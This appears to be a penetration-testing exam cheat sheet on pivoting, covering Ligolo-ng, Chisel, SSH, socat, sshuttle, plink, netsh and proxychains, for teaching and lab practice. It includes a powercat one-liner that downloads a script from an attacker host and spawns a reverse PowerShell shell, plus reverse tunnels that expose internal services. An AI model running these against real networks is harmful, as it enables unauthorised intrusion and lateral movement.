# Port forwarding and tunneling

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.


> **Single reference section** — use the appropriate tool based on your access.

## Ligolo-ng (Recommended)

```bash
# On attacker
sudo ip tuntap add user $(whoami) mode tun ligolo    # create Ligolo tunnel interface
sudo ip link set ligolo up                           # bring Ligolo interface online
./proxy -laddr <LHOST>:443 -selfcert                 # start Ligolo proxy listener

# On target
./agent -connect <LHOST>:443 -ignore-cert    # connect Ligolo agent to proxy

# In ligolo-ng console
session                                   # select Ligolo agent session
[Agent] » ifconfig                        # show agent network interfaces
sudo ip r add 172.16.1.0/24 dev ligolo    # route internal subnet through Ligolo
[Agent] » start                           # start Ligolo tunnel

# Port forwarding via Ligolo
[Agent] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp    # add TCP listener forward
```

Download: https://github.com/nicocha30/ligolo-ng/releases (use v0.6.2+)

Kali prebuilt binaries: `/usr/share/ligolo-ng-common-binaries`

```text
/usr/share/ligolo-ng-common-binaries
├── ligolo-ng_agent_0.8.3_darwin_amd64
├── ligolo-ng_agent_0.8.3_darwin_arm64
├── ligolo-ng_agent_0.8.3_linux_amd64
├── ligolo-ng_agent_0.8.3_linux_arm64
├── ligolo-ng_agent_0.8.3_windows_amd64.exe
├── ligolo-ng_agent_0.8.3_windows_arm64.exe
├── ligolo-ng_proxy_0.8.3_darwin_amd64
├── ligolo-ng_proxy_0.8.3_darwin_arm64
├── ligolo-ng_proxy_0.8.3_linux_amd64
├── ligolo-ng_proxy_0.8.3_linux_arm64
├── ligolo-ng_proxy_0.8.3_windows_amd64.exe
└── ligolo-ng_proxy_0.8.3_windows_arm64.exe
```

## Chisel

```bash
# SOCKS5 / Proxychains (attacker acts as server)
./chisel server -p 9002 -reverse -v     # start reverse Chisel server
./chisel client <LHOST>:9002 R:socks    # create reverse SOCKS proxy

# Single port forward
./chisel server -p 9002 -reverse -v                   # start reverse Chisel server
./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000    # forward remote port to target localhost
```

## SSH Tunneling

```bash
# Local port forward (attacker accesses target internal service)
ssh -N -L 0.0.0.0:4455:<INTERNAL_HOST>:445 <USERNAME>@<PIVOT>    # local forward to internal SMB

# Dynamic (SOCKS) — use with proxychains
ssh -N -D 0.0.0.0:9999 <USERNAME>@<PIVOT>    # create local SOCKS proxy
# proxychains.conf: socks5 <PIVOT_IP> 9999

# Remote port forward (target calls back to attacker)
ssh -N -R 127.0.0.1:2345:<INTERNAL_HOST>:5432 <USERNAME>@<LHOST>    # expose internal PostgreSQL remotely

# Remote dynamic
ssh -N -R 9998 <USERNAME>@<LHOST>    # create remote SOCKS proxy
# proxychains.conf: socks5 127.0.0.1 9998
```

## Socat

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432    # forward TCP port from pivot to target service
psql -h <PIVOT_IP> -p 2345 -U postgres              # connect through forwarded PostgreSQL port
```

## sshuttle

```bash
sshuttle -r <USERNAME>@<PIVOT>:2222 10.10.100.0/24 172.16.50.0/24    # route subnets through SSH
```

## Plink (Windows)

```bash
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <LHOST>    # reverse forward RDP through SSH
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833                                  # connect to forwarded RDP
```

## Netsh (Windows)

```bash
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_IP> connectport=22 connectaddress=<INTERNAL_HOST>    # add Windows portproxy
netsh advfirewall firewall add rule name="pf_ssh" protocol=TCP dir=in localip=<PIVOT_IP> localport=2222 action=allow           # allow forwarded port
# Cleanup:
netsh advfirewall firewall delete rule name="pf_ssh"                             # remove firewall rule
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<PIVOT_IP>    # remove portproxy
```

## powercat

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"    # download powercat and spawn reverse shell
```

## Proxychains

```bash
tail /etc/proxychains4.conf                                                             # confirm proxychains configuration
proxychains nmap -vvv -sT --top-ports=20 -Pn -n <TARGET>                                # scan through proxychains
proxychains smbclient -p 4455 //<TARGET>/<SHARE> -U <USERNAME> --password=<PASSWORD>    # access SMB through proxychains
```
